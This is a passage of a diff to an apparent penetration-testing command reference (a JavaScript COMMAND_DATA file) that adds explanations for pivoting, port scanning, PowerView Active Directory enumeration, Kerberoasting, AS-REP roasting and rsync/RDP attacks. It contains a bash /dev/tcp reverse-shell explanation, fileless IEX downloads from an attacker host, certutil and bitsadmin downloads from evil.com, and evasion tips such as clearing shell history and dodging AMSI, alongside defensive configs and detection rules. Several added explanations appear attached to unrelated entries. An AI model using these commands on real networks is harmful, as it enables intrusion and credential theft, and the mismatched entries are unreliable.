         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Sweeps an internal subnet for live hosts using only native shell tools, so no scanner upload is needed:\n  for i in {1..254}   loop over every host in the /24\n  ping -c 1 172.16.5.$i   send one ICMP echo to each\n  grep \"bytes from\"       keep only the addresses that replied\n  &                       background each ping so the sweep runs in parallel\nLists reachable internal hosts to target next; CMD, PowerShell, and the MSF ping_sweep module do the same on other footholds."
     },
     {
       "id": "crtp-portproxy-pivot",
@@ -58933,7 +59112,8 @@ const COMMAND_DATA = {
           "label": "Reverse via plink -R",
           "command": "plink -ssh -R <rport>:<int_target>:<int_port> <user>@<attacker>"
         }
-      ]
+      ],
+      "explain": "PuTTY's command-line SSH client for a Windows foothold, opening a SOCKS proxy:\n  -ssh              use the SSH protocol\n  -D <socks_port>   dynamic forward - a local SOCKS proxy over the SSH tunnel\n  <user>@<pivot>    SSH credentials for the pivot\nGives you a SOCKS proxy on Windows; point Proxifier at it to force apps like mstsc.exe through to internal targets."
     },
     {
       "type": "command",
@@ -59421,7 +59601,8 @@ const COMMAND_DATA = {
           "MITRE T1046",
           "MS Docs"
         ]
-      }
+      },
+      "explain": "Scans TCP ports from Windows with a pure-.NET PowerShell one-liner:\n  1..1024 | % {...}   iterate the port range\n  (New-Object Net.Sockets.TcpClient).Connect(\"<ip>\", $_)   attempt a TCP connect to each port\n  \"TCP port $_ is open\"   printed only when the connect succeeds\n  2>$null             suppress the errors from closed ports\nFinds open ports with no tools to upload; change the range (e.g. 3000..9000) as needed."
     },
     {
       "id": "ps-test-netconnection",
@@ -59522,7 +59703,8 @@ const COMMAND_DATA = {
           "MITRE T1046",
           "MS Docs"
         ]
-      }
+      },
+      "explain": "Tests TCP connectivity to a port from Windows PowerShell:\n  Test-NetConnection   built-in connectivity test\n  -Port <port>         the TCP port to probe\n  <ip>                 the target\nReturns TcpTestSucceeded True/False plus the remote address - a quick no-tools port check from a foothold (aliased as tnc)."
     },
     {
       "id": "powershell-shellcode-runner",
@@ -59866,7 +60048,8 @@ const COMMAND_DATA = {
           "label": "Audit each for escalation paths",
           "command": "Invoke-SQLAudit -Verbose"
         }
-      ]
+      ],
+      "explain": "Discovers and audits domain MSSQL instances:\n  Import-Module .\\PowerUpSQL.ps1                 load the toolkit\n  Get-SQLInstanceDomain                          find every SQL instance registered in AD via SPNs\n  Get-SQLQuery -Instance <instance> -Query '...'  run a query to check your rights (SYSTEM_USER, sysadmin membership)\nMaps reachable SQL servers and privilege-escalation paths (sysadmin, linked servers, xp_cmdshell); Invoke-SQLAudit automates the checks."
     },
     {
       "id": "ad-acl-forcechangepassword",
@@ -60311,7 +60494,8 @@ const COMMAND_DATA = {
       },
       "tools": [
         "PowerView"
-      ]
+      ],
+      "explain": "Checks whether you can write to any GPO with PowerView:\n  Get-DomainGPO | select displayname                  list the GPOs\n  Convert-NameToSid \"<user>\"                            resolve your principal's SID\n  Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {SID matches and rights like '*Write*'}   find GPOs you can modify\nWrite access to a GPO = code execution on every computer it applies to (via a startup script or scheduled task); Get-DomainGPOComputerLocalGroupMapping shows which hosts a GPO targets."
     },
     {
       "id": "ad-passwd-notreqd",
@@ -60399,7 +60583,8 @@ const COMMAND_DATA = {
           "label": "Try blank password on those accounts",
           "command": "crackmapexec smb <dc_ip> -u <user> -p ''"
         }
-      ]
+      ],
+      "explain": "Finds accounts that allow an empty password with PowerView:\n  Get-DomainUser -UACFilter PASSWD_NOTREQD   users with the PASSWD_NOTREQD UAC flag\n  | Select samaccountname,useraccountcontrol   confirm the flag\nThese accounts may authenticate with a blank password - test them with 'crackmapexec smb <dc> -u <list> -p \"\"'. Often leftovers from migrations or misconfigured service accounts."
     },
     {
       "id": "ad-powerview-preauth",
@@ -60511,7 +60696,8 @@ const COMMAND_DATA = {
           "label": "Crack offline",
           "command": "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
         }
-      ]
+      ],
+      "explain": "Finds AS-REP roastable accounts with PowerView:\n  Get-DomainUser -PreauthNotRequired   users with 'Do not require Kerberos preauth' set (UAC 4194304)\n  | select samaccountname,userprincipalname,useraccountcontrol   confirm the targets\nTheir AS-REP is encrypted with the account's NT hash and can be requested without creds - roast with Rubeus asreproast and crack offline (hashcat -m 18200)."
     },
     {
       "id": "ad-foreign-groupmember",
@@ -60622,7 +60808,8 @@ const COMMAND_DATA = {
           "label": "Abuse that access across the trust",
           "command": "# use the account's rights in the foreign domain"
         }
-      ]
+      ],
+      "explain": "Finds cross-forest group membership with PowerView:\n  Get-DomainForeignGroupMember   list principals from another domain who are members of this domain's groups\n  -Domain <foreign_domain>        the trusted domain to inspect\nForeign members inherit the group's rights, sometimes privileged - a common trust-abuse foothold; resolve the returned SIDs with ConvertFrom-SID."
     },
     {
       "id": "ad-find-interesting-acl",
@@ -60760,7 +60947,8 @@ const COMMAND_DATA = {
           "label": "Filter to your principals + note the right (GenericAll/WriteDacl/ForceChangePassword)",
           "command": "# pick the abuse: add-member / reset-password / targeted-kerberoast / RBCD"
         }
-      ]
+      ],
+      "explain": "Surfaces abusable ACL entries across the domain with PowerView:\n  Find-InterestingDomainAcl   find non-default ACEs granting control over objects\n  -ResolveGUIDs               translate rights GUIDs into readable names (e.g. ForceChangePassword)\nReports where a principal has GenericAll/GenericWrite/WriteDACL/WriteOwner/ForceChangePassword/AddMember over another object - the raw material for ACL-abuse privesc paths; filter by IdentityReferenceName to focus on accounts you control."
     },
     {
       "id": "ad-powerview-spn",
@@ -60861,7 +61049,8 @@ const COMMAND_DATA = {
           "label": "Then roast",
           "command": "Get-DomainUser -SPN | Get-DomainSPNTicket -Format Hashcat"
         }
-      ]
+      ],
+      "explain": "Lists Kerberoastable SPN accounts with PowerView:\n  Get-DomainUser -SPN   users that have a ServicePrincipalName set\n  -Properties samaccountname,ServicePrincipalName   return the SPN\nThese accounts can be Kerberoasted; prioritize ones with admincount=1 or RC4 support - feed them to Rubeus kerberoast or GetUserSPNs.py."
     },
     {
       "id": "ad-powerview-spnticket",
@@ -61079,7 +61268,8 @@ const COMMAND_DATA = {
           "label": "Domain Admins recursively",
           "command": "Get-DomainGroupMember -Identity 'Domain Admins' -Recurse | select MemberName"
         }
-      ]
+      ],
+      "explain": "Expands group membership, including nested groups, with PowerView:\n  Get-DomainGroupMember -Identity \"<group>\"   list the group's members\n  -Recurse                                    follow nested group membership to the real effective members\nReveals who actually holds privileged rights (Domain Admins membership is often nested several levels deep) - the true target list for compromise."
     },
     {
       "id": "ad-powerview-trustmapping",
@@ -61173,7 +61363,8 @@ const COMMAND_DATA = {
           "label": "External trusts only",
           "command": "Get-DomainTrust | ?{$_.TrustAttributes -notmatch 'WITHIN_FOREST'}"
         }
-      ]
+      ],
+      "explain": "Maps every trust reachable in the environment with PowerView:\n  Get-DomainTrustMapping   recursively walk trusts from the current domain outward\nUnlike Get-ADTrust (current domain only) this reveals the full forest/inter-forest trust graph - filter for Bidirectional trusts to find the widest attack paths between domains."
     },
     {
       "id": "ad-powerview-domainuser",
@@ -61283,7 +61474,8 @@ const COMMAND_DATA = {
           "label": "Only privileged (admincount=1)",
           "command": "Get-DomainUser -AdminCount | select samaccountname"
         }
-      ]
+      ],
+      "explain": "Reads detailed user attributes with PowerView:\n  Get-DomainUser   query user objects\n  -Identity <user>   a specific account (omit for all users)\n  -Domain <domain>   target a specific domain\nReturns UAC flags, SPN, logon history, admincount, and password metadata; select the columns you need, or pipe to a description filter to hunt for creds."
     },
     {
       "id": "ad-powerview-import",
@@ -61381,7 +61573,8 @@ const COMMAND_DATA = {
           "label": "Load fileless (after AMSI bypass)",
           "command": "iex (New-Object Net.WebClient).DownloadString('http://<attacker>/PowerView.ps1')"
         }
-      ]
+      ],
+      "explain": "Loads the PowerView enumeration toolkit into the session:\n  Import-Module .\\PowerView.ps1   make the Get-Domain*/Find-*/Invoke-* cmdlets available\nRequired before any PowerView command; run 'powershell -ep bypass' first if the execution policy blocks it, or load it fileless with IEX (New-Object Net.WebClient).DownloadString('http://<ip>/PowerView.ps1') to avoid touching disk."
     },
     {
       "id": "ad-description-passwords",
@@ -61473,7 +61666,8 @@ const COMMAND_DATA = {
           "label": "Filter to non-empty descriptions",
           "command": "Get-DomainUser * | ?{$_.description} | Select samaccountname,description"
         }
-      ]
+      ],
+      "explain": "Hunts for passwords admins left in AD description fields:\n  Get-DomainUser *                                   all user objects\n  | Select samaccountname,description                keep name + description\n  | Where {$_.description -ne $null}                 drop the empty ones\nDescriptions are readable by any authenticated user, so temp/service passwords stored there are free creds; add a -match 'pass|pw|temp' filter, and repeat with Get-DomainComputer."
     },
     {
       "id": "ad-acl-targeted-kerberoast",
@@ -61711,7 +61905,8 @@ const COMMAND_DATA = {
           "label": "Move laterally to those hosts",
           "command": "# PSRemoting / wmiexec, then dump creds"
         }
-      ]
+      ],
+      "explain": "Tests for local admin rights on a remote host with PowerView:\n  Test-AdminAccess -ComputerName <target>   try to open the target's Service Control Manager with admin rights\nReturns True/False quickly, so you can loop it over every domain computer to find where your current context is already local admin - a direct lateral-movement lead."
     },
     {
       "id": "crtp-powerview-acls",
@@ -64193,7 +64388,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Encrypts a file with AES-256 before moving it, so an intercepted transfer is useless without the key:\n  openssl enc -aes256   symmetric AES-256 encryption\n  -iter 100000 -pbkdf2  derive the key from your passphrase with 100000 PBKDF2 rounds\n  -in <file>            plaintext input\n  -out <file>.enc       ciphertext output\nProduces an encrypted blob to transfer; reverse with -d to decrypt (Invoke-AESEncryption is the Windows equivalent)."
     },
     {
       "id": "proxychains-run",
@@ -64298,7 +64494,8 @@ const COMMAND_DATA = {
           "label": "Quiet mode",
           "command": "proxychains -q <command>"
         }
-      ]
+      ],
+      "explain": "Forces a tool's TCP traffic through the SOCKS/HTTP proxy configured in /etc/proxychains.conf:\n  proxychains <command>   run any command with its connections redirected through the proxy\nLets non-SOCKS-aware tools reach the internal network via your pivot tunnel; use nmap -sT (full TCP connect) since raw/SYN scans do not tunnel, and -q to silence proxychains output."
     },
     {
       "type": "payload",
@@ -64624,7 +64821,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Tunnels TCP inside ICMP echo packets, for networks that only allow ping outbound:\n  sudo ./ptunnel-ng   needs root to craft raw ICMP\n  -r<pivot_ip>        the remote pivot that forwards the tunneled traffic\n  -R22                forward to port 22 on the far side (SSH)\nRun this as the server on the pivot; the client side then SSHes to the local tunnel port (add -D for SOCKS over the ICMP channel)."
     },
     {
       "id": "pypykatz-minidump",
@@ -64952,7 +65150,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
         "evasion": "Use key/valid-cred auth so it blends with admin activity; avoid writing tools to disk - pipe commands over the session; clean shell history."
-      }
+      },
+      "explain": "Enumerates legacy r-services (rlogin/rsh/rexec):\n  sudo nmap -sV   version-detect\n  -p 512,513,514  the r-services ports\n  <ip>            target\nThese trust hosts listed in .rhosts/hosts.equiv; a wildcard '+ +' entry lets anyone authenticate with no password - 'rusers -al' lists users, and rlogin gets you in."
     },
     {
       "id": "ad-raisechild",
@@ -65161,7 +65360,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# RDP without NLA - authentication happens INSIDE the session (post-connection):\n# Attacker can reach the Windows login screen without any prior auth\n# Enables brute force + BlueKeep/DejaBlue exploitation\n\n# Disconnected sessions hijackable:\n# > query session  -> shows disconnected admin session\n# > tscon <ID> /dest:console  (as SYSTEM) -> hijacks session without password",
         "secure_config": "# Enable NLA:\n# Group Policy: Computer Config -> Admin Templates -> Windows Components -> RDS\n#   'Require NLA' = Enabled\n# Registry: HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\n#   UserAuthentication = 1\n\n# Restrict RDP access:\nNew-NetFirewallRule -Name 'RDP Allow' -Protocol TCP -LocalPort 3389 \\\n    -RemoteAddress 10.10.1.0/24 -Action Allow\nNew-NetFirewallRule -Name 'RDP Block' -Protocol TCP -LocalPort 3389 -Action Block\n\n# Prevent session hijacking:\n# Enable RDP session timeouts + automatic logoff for disconnected sessions\n# GPO: Disconnect + log off after 15 minutes idle",
         "evasion": "WinRM with valid creds looks like normal management; avoid dropping tools - run built-ins over the session; clear PSReadline history on the remote host after."
-      }
+      },
+      "explain": "Enumerates an RDP service and its security settings:\n  nmap -sV -sC <ip> -p3389   version + default scripts on RDP\n  --script rdp*              run the RDP-specific NSE scripts\nReports the RDP config; rdp-sec-check.pl then flags weak security layers (e.g. no NLA, downgrade to RDP Security), and xfreerdp connects once you have creds."
     },
     {
       "type": "command",
@@ -65256,7 +65456,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Target systems allow arbitrary file downloads via curl, wget, certutil, bitsadmin, or PowerShell Invoke-WebRequest without application allowlisting or egress filtering. Attackers use these native tools (LOLBins) to fetch payloads from attacker-controlled servers, bypassing endpoint protection that might detect known malicious tool names.",
         "vulnerable_config": "# Living-off-the-land file download methods (all built into Windows/Linux):\n# PowerShell (often bypasses older AV):\n(New-Object Net.WebClient).DownloadFile('http://evil.com/shell.exe', 'C:\\Temp\\shell.exe')\n\n# certutil (trusted Microsoft binary, often not blocked):\ncertutil -urlcache -split -f http://evil.com/payload.exe payload.exe\n\n# bitsadmin (background transfer service):\nbitsadmin /transfer myJob http://evil.com/shell.exe C:\\Temp\\shell.exe\n\n# All of these bypass controls that only look for 'nc.exe', 'mimikatz.exe', etc.",
         "secure_config": "# Application allowlisting (most effective):\n# Windows Defender Application Control (WDAC) or AppLocker\n# Only signed, approved executables run\n# Blocks dropping and running arbitrary payloads even via LOLBins\n\n# PowerShell Constrained Language Mode + AMSI:\n# GPO: PowerShell Execution Policy = AllSigned\n# Blocks unsigned scripts; AMSI scans all scripts before execution\n\n# Egress filtering - block outbound to unknown IPs:\n# Web proxy with allowlist for legitimate update sources\n# Alert on: certutil with -urlcache flag (Event 4688 + command line audit)\n# Sysmon Rule: ProcessCreate where Image = certutil.exe and CommandLine contains 'urlcache'\n\n# Network IDS: alert on HTTP/HTTPS downloads initiated by certutil, bitsadmin process\n# Defender ATP: 'Suspicious process using Certutil to download content'"
-      }
+      },
+      "explain": "Redirects a local folder into an RDP session so you can drag files across the RDP channel:\n  xfreerdp /v:<ip>          connect to the target\n  /u:<user> /p:<pass>       credentials\n  /drive:linux,/home/user/share   share this local folder into the session as drive 'linux'\nInside the session the folder appears under 'This PC', letting you copy files both ways when other channels are blocked."
     },
     {
       "id": "rdp-bruteforce",
@@ -65586,7 +65787,8 @@ const COMMAND_DATA = {
           "command": "./finalrecon.py --full --url http://<domain> -o json",
           "label": "Full scan -> JSON"
         }
-      ]
+      ],
+      "explain": "FinalRecon runs several recon modules against a URL in one pass:\n  --headers    grab and analyse HTTP response headers\n  --whois      pull domain registration data\n  --url http://<domain>   the target to profile\nProduces a quick attack-surface picture; add --full to also run SSL, DNS, subdomain, crawl, directory, Wayback and port-scan modules (-o json to save)."
     },
     {
       "id": "crtp-exec-env-recon",
@@ -69312,7 +69514,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Outbound connections from servers are not filtered - any process can initiate a TCP connection to arbitrary external IPs on any port. This enables reverse shell callbacks. Additionally, common shell payloads (nc, bash, python) are available on the target, and PowerShell execution policy is not enforced.",
         "vulnerable_config": "# No egress firewall rules on compromised host:\niptables -L OUTPUT  # policy ACCEPT, no rules\n# nc, bash, python3 all available\n\n# Windows - PowerShell unrestricted:\nGet-ExecutionPolicy  # Unrestricted or Bypass\n# Defender not detecting reverse shell payloads (AV evasion successful)",
         "secure_config": "# Linux egress filtering:\niptables -P OUTPUT DROP\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\niptables -A OUTPUT -p tcp --dport 443 -d <known_good_ips> -j ACCEPT\n# Blocks arbitrary reverse shell callbacks\n\n# Windows - PowerShell Constrained Language Mode:\n# GPO: Enable WDAC policy\n# Set execution policy = AllSigned (unsigned scripts blocked)\n\n# Windows Defender AMSI: scans all PS scripts before execution\n# AMSI bypass detection: EDR products detect common AMSI bypass patterns\n\n# Application allowlisting (AppLocker/WDAC):\n# Blocks execution of dropped payloads and LOLBin abuse\n# The most effective defense against arbitrary payload execution"
-      }
+      },
+      "explain": "Reverse-shell payload run on the target to call back to your listener:\n  bash -c '...'                 run the one-liner in bash\n  bash -i                       start an interactive shell\n  >& /dev/tcp/<lhost>/<lport>   redirect it over a TCP socket to your host/port\n  0>&1                          wire stdin back through the same socket\nThe victim initiates the outbound connection, which usually gets past egress firewall rules; catch it with a netcat listener."
     },
     {
       "id": "rfi",
@@ -69548,7 +69751,8 @@ const COMMAND_DATA = {
           "label": "Enumerate users/groups",
           "command": "rpcclient $> enumdomusers ; enumdomgroups"
         }
-      ]
+      ],
+      "explain": "Opens an anonymous RPC session to a DC:\n  rpcclient   MS-RPC client\n  -U \"\"       empty username (null session)\n  -N          no password prompt\n  <dc_ip>     the target\nIf null sessions are allowed you can then run enumdomusers, enumdomgroups, querydominfo, etc. to enumerate the domain with no credentials - common on older/legacy systems."
     },
     {
       "id": "ad-rpcclient-spray",
@@ -69749,7 +69953,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy - direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
         "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering - block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring - detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection - detect reverse tunnels in HTTPS streams"
       },
-      "type": "command"
+      "type": "command",
+      "explain": "Runs the rpivot server on your attack host so a pivot can reverse-connect and expose a SOCKS proxy:\n  --proxy-port 9050    local SOCKS port your tools will use\n  --server-port 9999   port the rpivot client dials back to\n  --server-ip 0.0.0.0  bind on all interfaces so the pivot can reach it\nAfter client.py runs on the pivot, browse internal web apps through proxychains - handy when the pivot cannot accept inbound connections."
     },
     {
       "type": "command",
@@ -69843,7 +70048,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# IPMI cipher 0 - no authentication required:\n# ipmitool -H <ip> -U admin -P '' -I lanplus -C 0 chassis status\n# Returns valid data - auth bypassed entirely\n\n# rsync anonymous access:\n# rsync --list-only rsync://<ip>/  # lists all modules without auth\n# rsync rsync://<ip>/backup /tmp   # downloads backup files\n\n# Oracle TNS - version banner reveals exact version:\n# nmap -p 1521 -sV -> Oracle Database 11.2.0.4 (exact version)",
         "secure_config": "# IPMI - disable cipher 0, enable only strong ciphers:\n# /etc/ipmi/ipmievd.conf: IPMI_CIPHER_SUITE=17  (AES, mandatory auth)\n# Or disable IPMI entirely if not needed (BMC IPMI = critical attack surface)\n\n# rsync - require auth:\n# /etc/rsyncd.conf:\n# [backup]\n#   auth users = backupuser\n#   secrets file = /etc/rsyncd.secrets\n#   hosts allow = 10.10.1.0/24\n\n# RSH/rexec - disable entirely (replaced by SSH):\nsystemctl disable rsh.socket rexec.socket rlogin.socket\n\n# Oracle TNS - disable remote admin, enforce auth:\n# sqlnet.ora: SQLNET.AUTHENTICATION_SERVICES = (BEQ, TCPS)  (not NONE)",
         "evasion": "Use key/valid-cred auth so it blends with admin activity; avoid writing tools to disk - pipe commands over the session; clean shell history."
-      }
+      },
+      "explain": "Enumerates an rsync daemon's exposed modules:\n  rsync -av        archive mode, verbose\n  --list-only      list contents without transferring\n  rsync://127.0.0.1/dev   the daemon URL and module name\nRsync daemons on 873 often expose modules without auth; list them, then pull files by dropping --list-only (tunnel over SSH if the daemon is bound to localhost)."
     },
     {
       "id": "ad-rubeus-asrep",
@@ -70866,7 +71072,8 @@ const COMMAND_DATA = {
         "vulnerable_config": "# Service listening on all interfaces with default creds (common in labs/staging):\nss -tlnp | grep LISTEN\n# 0.0.0.0:21  (FTP on all interfaces)\n# 0.0.0.0:3306 (MySQL on all interfaces - should be 127.0.0.1 only)\n# 0.0.0.0:8080 (Tomcat with manager app accessible)\n\n# Running services as root:\nps aux | grep -E '(mysql|apache|nginx|ftp)'\n# root  1234  /usr/sbin/mysqld  <-- should run as 'mysql' user",
         "secure_config": "# Bind services to localhost or specific IPs (not 0.0.0.0):\n# MySQL: my.cnf -> bind-address = 127.0.0.1\n# Apache: Listen 127.0.0.1:80 (if behind a proxy)\n\n# Run services as dedicated low-priv users:\n# systemd unit: User=mysql Group=mysql\n\n# Host-based firewall (ufw):\nufw default deny incoming\nufw allow from 10.10.1.0/24 to any port 22  # SSH from mgmt only\nufw allow 443  # HTTPS\nufw enable\n\n# Change all default credentials immediately after installation\n# Enable fail2ban for SSH and web services",
         "evasion": "Vet and test the PoC off-target; run the final exploit once; remove any dropped files after."
-      }
+      },
+      "explain": "Searches the local Exploit-DB copy for public exploits:\n  searchsploit <product> <version>   match a fingerprinted service to known exploits\nMaps a version to available PoCs; run 'searchsploit --update' first to refresh the DB, and 'searchsploit -x <id>' to read one before use."
     },
     {
       "id": "ad-secretsdump-dcsync",
@@ -71903,7 +72110,8 @@ const COMMAND_DATA = {
           "label": "4. Check tcpdump for PSH flag carrying banner bytes",
           "command": "# Look for: Flags [P.] with payload = banner string\n# Confirms what nmap -sV couldn't show from a fast sweep"
         }
-      ]
+      ],
+      "explain": "Grabs a service banner manually with netcat:\n  nc   the connection tool\n  -n   no DNS\n  -v   verbose\n  <ip> 25   connect to the port (here SMTP)\nWhatever the service prints identifies it; run tcpdump on the same interface alongside to capture and confirm the exact exchange."
     },
     {
       "id": "crtp-session-share-hunting",
@@ -72734,7 +72942,8 @@ const COMMAND_DATA = {
           "label": "Import the zip into BloodHound",
           "command": "# drag-drop zip -> run 'Shortest paths to Domain Admins'"
         }
-      ]
+      ],
+      "explain": "Collects BloodHound data natively on a Windows host:\n  .\\SharpHound.exe   the C# collector\n  -c All             run all collection methods (more accurate sessions/local-admin than the Python collector)\n  --zipfilename <name>   name the output ZIP\nProduces a ZIP of JSON to import into BloodHound; use -c DCOnly for a quieter LDAP-only collection with no host touching."
     },
     {
       "id": "ad-sharpview",
@@ -72836,7 +73045,8 @@ const COMMAND_DATA = {
           "label": "Any PowerView function, compiled",
           "command": ".\\SharpView.exe Get-DomainGroupMember -Identity 'Domain Admins'"
         }
-      ]
+      ],
+      "explain": "Runs PowerView functionality as a compiled binary (SharpView):\n  .\\SharpView.exe Get-DomainUser   invoke a PowerView cmdlet from the .exe\n  -Identity <user>                 the same parameters PowerView uses\nRuns without a PowerShell session, dodging PowerShell/AMSI-based detection; supports the full PowerView API (Get-DomainUser -SPN, Get-DomainGroupMember -Recurse, etc.)."
     },
     {
       "type": "payload",
@@ -73263,7 +73473,8 @@ const COMMAND_DATA = {
         "misconfiguration": "Relying solely on Sysmon for process monitoring without ETW-level telemetry misses PPID spoofing (Sysmon records the spoofed parent, not the real one). Not monitoring Microsoft-Windows-DotNETRuntime misses PowerShell injection into running processes. Running SilkETW output to a local file without SIEM forwarding = telemetry dies with the host if compromised.",
         "vulnerable_config": "# Sysmon-only configuration - misses PPID spoofing:\n# Sysmon Event ID 1 records ParentProcessId from process creation\n# When attacker uses PROC_THREAD_ATTRIBUTE_PARENT_PROCESS:\n#   Sysmon reports the SPOOFED parent (e.g., explorer.exe)\n#   NOT the real parent (malicious process)\n# Result: malicious process appears to have legitimate lineage\n\n# No ETW DotNETRuntime monitoring = PowerShell injection invisible:\n# Invoke-PSInject loads PS assembly into target process\n# No Event ID generated in Security or Sysmon logs\n# AMSI bypass means PS script block logging also silent",
